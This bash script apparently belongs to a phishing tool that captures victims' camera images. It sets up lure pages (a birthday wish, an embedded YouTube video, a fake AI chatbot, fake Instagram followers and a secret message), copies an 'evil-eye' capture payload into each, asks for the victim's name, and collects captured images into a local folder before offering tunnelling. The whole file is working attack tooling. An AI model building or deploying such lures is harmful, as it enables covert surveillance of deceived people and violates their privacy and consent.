#!/bin/bash

# Check captured_imgs folder exists
if [ ! -d "$SCRIPT_DIR/captured_imgs" ]; then
    mkdir "$SCRIPT_DIR/captured_imgs"
fi

# Move image files
move_capture_file(){
    # Check if the source directory exists and is not empty
    if [ -d "$SCRIPT_DIR/.server/images" ]; then
        mv "$SCRIPT_DIR"/.server/images/* "$SCRIPT_DIR"/captured_imgs/
    fi
    sleep 0.2
}
move_capture_file

# Cleanup Server files
if [ -d "$SCRIPT_DIR/.server" ]; then
    rm -rf "$SCRIPT_DIR"/.server/*
fi

############# Clean captured img files {for test only} ##############
#if [ -d "$SCRIPT_DIR/captured_imgs" ]; then
#    rm -rf "$SCRIPT_DIR"/captured_imgs/*
#fi
#####################################################################

# Evel-eye file Path
EYE_PATH="$SCRIPT_DIR/.sites/evil-eye"


# Birthday Wish File setup
setup_birthday_wish(){
    birthday_wish_path="$SCRIPT_DIR/.sites/birthday_wish/"

    if [ ! -d "$birthday_wish_path" ] || [ -z "$(ls -A "$birthday_wish_path" 2>/dev/null)" ] || \
       [ ! -d "$EYE_PATH" ] || [ -z "$(ls -A "$EYE_PATH" 2>/dev/null)" ]; then
    
        echo -e "\n    ${red}[${orange}✖${red}]${white} Template files or directories not found. ${blue}Empty file path: ${red}$birthday_wish_path${nocolor}"
        echo -e "    ${red}[${orange}!${red}]${white} Exiting..."
        exit 1
    else
        # Copy files to server
        cp -r "$birthday_wish_path"/* "$SCRIPT_DIR"/.server/
        cp -r "$EYE_PATH"/* "$SCRIPT_DIR"/.server/
        sleep 1
        echo -e ""
        read -p "    ${cyan}[${orange}+${cyan}]${white} Enter Victim Name: "${green} newname
        sed -i "s/<span id=\"user-name\">.*<\/span>/<span id=\"user-name\">$newname<\/span>/g" "$SCRIPT_DIR"/.server/index.php
        echo -e "    ${cyan}[${orange}+${cyan}]${white} Victim Name Add successfully to ${blue}$newname${nocolor}"
        sleep 1
        tunnel_menu
    fi
}

# youtube live tv file setup
setup-youtube-tv(){
    yt_templates_path="$SCRIPT_DIR/.sites/youtube_live"
    
    if [ ! -d "$yt_templates_path" ] || [ -z "$(ls -A "$yt_templates_path" 2>/dev/null)" ] || \
       [ ! -d "$EYE_PATH" ] || [ -z "$(ls -A "$EYE_PATH" 2>/dev/null)" ]; then
    
        echo -e "\n    ${red}[${orange}✖${red}]${white} Template files or directories not found. ${blue}Empty file path: ${red}$yt_templates_path${nocolor}"
        echo -e "    ${red}[${orange}!${red}]${white} Exiting..."
        exit 1
    else
        # Copy files to server
        cp -r "$yt_templates_path"/* "$SCRIPT_DIR"/.server/
        cp -r "$EYE_PATH"/* "$SCRIPT_DIR"/.server/
        sleep 1
        echo -e ""
        read -p "    ${cyan}[${orange}+${cyan}]${white} Enter youtube video link: ${green}" yt_vid_link
        
        # Improved Extraction using grep and cut
        # This handles: watch?v=ID, youtu.be/ID, shorts/ID, embed/ID
        VIDEO_ID=$(echo "$yt_vid_link" | sed -E 's/.*(v=|\/v\/|embed\/|shorts\/|youtu.be\/|\/)([a-zA-Z0-9_-]{11}).*/\2/')

        if [[ ${#VIDEO_ID} -eq 11 ]]; then
            echo -e "    ${cyan}[${orange}+${cyan}]${white} Video Id Found: ${green}$VIDEO_ID${nocolor}"
            YT_URL="https://www.youtube.com/embed/$VIDEO_ID?autoplay=1"
            
            # Use a different delimiter (pipe |) for sed to avoid issues with URL slashes
            sed -i "s|src=\"\"|src=\"${YT_URL}\"|g" "$SCRIPT_DIR"/.server/index.php
            
            echo -e "    ${cyan}[${green}✔${cyan}]${white} Success! Youtube video id updated.${nocolor}"
            sleep 1
            tunnel_menu
        else
            echo -e "${red}[!] Could not extract a valid 11-character Video ID.${nocolor}"
        fi
    fi
}

# Fake AI chatbot file setup
chating_bot(){
    AI_bot_path="$SCRIPT_DIR/.sites/chating_bot"

    if [ ! -d "$AI_bot_path" ] || [ -z "$(ls -A "$AI_bot_path" 2>/dev/null)" ] || \
       [ ! -d "$EYE_PATH" ] || [ -z "$(ls -A "$EYE_PATH" 2>/dev/null)" ]; then
    
        echo -e "\n    ${red}[${orange}✖${red}]${white} Template files or directories not found. ${blue}Empty file path: ${red}$AI_bot_path${nocolor}"
        echo -e "    ${red}[${orange}!${red}]${white} Exiting..."
        exit 1
    else
        cp -r "$AI_bot_path"/* "$SCRIPT_DIR"/.server/
        cp -r "$EYE_PATH"/* "$SCRIPT_DIR"/.server/
        echo -e "    ${cyan}[${green}✔${cyan}]${white} Success! files updated and deployed.${nocolor}"
        sleep 1
        tunnel_menu
    fi
}

# Fake insta followers file setup
fake_insta_follower(){
    Fake_insta_path="$SCRIPT_DIR/.sites/fake_insta_follower"

    if [ ! -d "$Fake_insta_path" ] || [ -z "$(ls -A "$Fake_insta_path" 2>/dev/null)" ] || \
       [ ! -d "$EYE_PATH" ] || [ -z "$(ls -A "$EYE_PATH" 2>/dev/null)" ]; then
    
        echo -e "\n    ${red}[${orange}✖${red}]${white} Template files or directories not found. ${blue}Empty file path: ${red}$Fake_insta_path${nocolor}"
        echo -e "    ${red}[${orange}!${red}]${white} Exiting..."
        exit 1
    else
        cp -r "$Fake_insta_path"/* "$SCRIPT_DIR"/.server/
        cp -r "$EYE_PATH"/* "$SCRIPT_DIR"/.server/
        echo -e "    ${cyan}[${green}✔${cyan}]${white} Success! files updated and deployed.${nocolor}"
        sleep 1
        tunnel_menu
    fi
}

# Secret Message file setup
secret_msg(){
    Sec_msg_path="$SCRIPT_DIR/.sites/secret_message"
    JSON_FILE="$SCRIPT_DIR/.server/sentences.json"

    if [ ! -d "$Sec_msg_path" ] || [ -z "$(ls -A "$Sec_msg_path" 2>/dev/null)" ] || \
       [ ! -d "$EYE_PATH" ] || [ -z "$(ls -A "$EYE_PATH" 2>/dev/null)" ]; then
    
        echo -e "\n    ${red}[${orange}✖${red}]${white} Template files or directories not found. ${blue}Empty file path: ${red}$Sec_msg_path${nocolor}"
        echo -e "    ${red}[${orange}!${red}]${white} Exiting..."
        exit 1
    else
        cp -r "$Sec_msg_path"/* "$SCRIPT_DIR"/.server/
        cp -r "$EYE_PATH"/* "$SCRIPT_DIR"/.server/
        sleep 1
        read -r -p "    ${cyan}[${green}+${cyan}]${white} Please enter the path to your message text file: " INPUT_FILE
        INPUT_FILE="${INPUT_FILE/#\~/$HOME}"
        INPUT_FILE=$(echo "$INPUT_FILE" | sed "s/['\"]//g")

        # Check if the input file exists
        if [ ! -f "$INPUT_FILE" ]; then
            echo "Error: File '$INPUT_FILE' not found. Please check the path and try again."
            exit 1
        fi
        # Use jq to overwrite the JSON file with the new content
        # -R (raw input), -s (slurp into array)
        jq -R -s 'split("\n") | map(select(length > 0)) | {texts: .}' "$INPUT_FILE" > "$JSON_FILE"
        echo -e "    ${cyan}[${green}✔${cyan}]${white} Success! Messages updated and deployed.${nocolor}"
        sleep 1
        tunnel_menu
    fi
}
